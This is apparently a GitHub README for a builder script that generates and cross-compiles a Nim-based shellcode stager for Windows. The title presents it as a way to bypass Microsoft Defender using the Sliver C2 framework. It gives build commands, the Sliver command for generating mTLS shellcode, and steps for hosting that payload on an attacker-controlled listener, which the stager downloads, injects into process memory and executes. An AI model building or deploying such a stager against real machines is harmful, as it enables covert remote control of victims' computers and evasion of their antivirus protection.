# Bypass Microsoft Defender with Sliver C2

This repository contains a Python-based automation script designed for educational labs. It streamlines the process of generating, configuring, and cross-compiling a Nim-based shellcode stager for Windows environments.

* * * * *

Overview
--------

The `builder.py` script automates the creation of a Windows executable (`stager.exe`) that:

1.  Connects to a specified IP and Port via HTTP.

2.  Downloads a raw shellcode payload (`shellc.bin`).

3.  Injects the payload into the current process memory.

4.  Executes the payload using native Windows API calls.

Prerequisites
-------------

To use this builder, you should be operating in a **Debian-based Linux environment** (e.g., Kali Linux, Ubuntu). The script requires:

-   **Python 3.x**

-   **Sudo Privileges** (to install `mingw-w64` and `nim` if they are missing)

-   **Internet Access** (to fetch dependencies and the `winim` library)

Usage
-----

Run the script using Python 3, providing your listener IP and Port:

```
python3 builder.py -l <LISTENER_IP> -p <LISTENER_PORT>

```

### Example

```
python3 builder.py -l 192.168.1.5 -p 80

```

### Help Menu

```
python3 builder.py -h

```
<img width="1441" height="710" alt="image" src="https://github.com/user-attachments/assets/6a171b11-a4b9-4b64-aa14-7182e32dbc3c" />

* * * * *

What the Script Does
--------------------

1.  **Templating:** It generates a `stager.nim` file, dynamically inserting your listener IP and Port into the download URL.

2.  **Dependency Check:** It verifies if `mingw-w64` (the cross-compiler) and `nim` are installed. If not, it attempts to install them via `apt`.

3.  **Library Management:** It uses `nimble` to install the `winim` library, which allows Nim to interface with the Windows API.

4.  **Cross-Compilation:** It compiles the Nim source code into a 64-bit Windows executable (`stager.exe`) using the MinGW toolchain.

* * * * *

Post-Build Instructions (Sliver C2)
-----------------------------------

Once the `stager.exe` is successfully generated, you must prepare the payload it is designed to fetch. Using the **Sliver C2** framework, run the following command to generate the compatible shellcode:

Bash

```
generate --mtls <LISTENER_IP>:<LISTENER_PORT> --os windows --arch amd64 --format shellcode

```

> **Note:** Rename the output file from Sliver to `shellc.bin` and host it on your web server at the root directory so the stager can reach it at:
>
> `http://<LISTENER_IP>:<LISTENER_PORT>/shellc.bin`
